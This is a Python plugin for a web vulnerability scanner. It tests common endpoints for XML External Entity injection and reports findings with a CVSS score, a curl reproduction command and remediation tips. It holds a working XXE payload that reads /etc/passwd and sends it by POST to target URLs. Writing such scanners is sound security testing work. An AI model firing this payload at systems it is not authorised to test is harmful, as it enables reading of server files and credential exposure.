"""XXE Scanner — XML External Entity injection testing."""
import logging
import urllib.request
from scanners.core.registry import register_scanner

logger = logging.getLogger("smp.scan")

XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
XXE_ENDPOINTS = ["/api", "/upload", "/import", "/xml", "/parse", "/soap", "/service", "/ws"]

@register_scanner(name="XXE Scanner", step_name="Running XXE Scanner", depends_on=['Tech Fingerprint'], binary_name="", needs_binary=False, confidence=85)
def run_xxe_scan(url):
    logger.info(f"XXE Scanner: Testing {url}")
    base = url.rstrip("/")
    findings = []
    for ep in XXE_ENDPOINTS:
        try:
            req = urllib.request.Request(
                base + ep,
                data=XXE_PAYLOAD.encode(),
                headers={"Content-Type": "application/xml", "User-Agent": "SMP/9.3.2"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=6) as resp:
                body = resp.read(1024).decode(errors="replace")
                if "root:" in body or "/bin/" in body:
                    findings.append({
                        "severity": "Critical",
                        "title": "XXE: XML External Entity Injection",
                        "description": f"XXE injection successful at {base+ep}. Server returned /etc/passwd content.",
                        "url": base + ep,
                        "owasp_category": "A05:2021 - Security Misconfiguration",
                        "cvss_score": 9.8,
                        "affected_component": base + ep,
                        "business_impact": "XXE allows reading arbitrary server files (credentials, config), SSRF, and in some parsers leads to Remote Code Execution.",
                        "evidence": body[:200],
                        "reproduction_steps": f"curl -X POST {base+ep} -H 'Content-Type: application/xml' -d '{XXE_PAYLOAD}'",
                        "remediation_code": "# Disable external entity processing:\n# Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n# Python lxml: etree.XMLParser(resolve_entities=False)",
                        "references_json": ["https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration", "https://portswigger.net/web-security/xxe"]
                    })
        except Exception:
            continue
    return findings
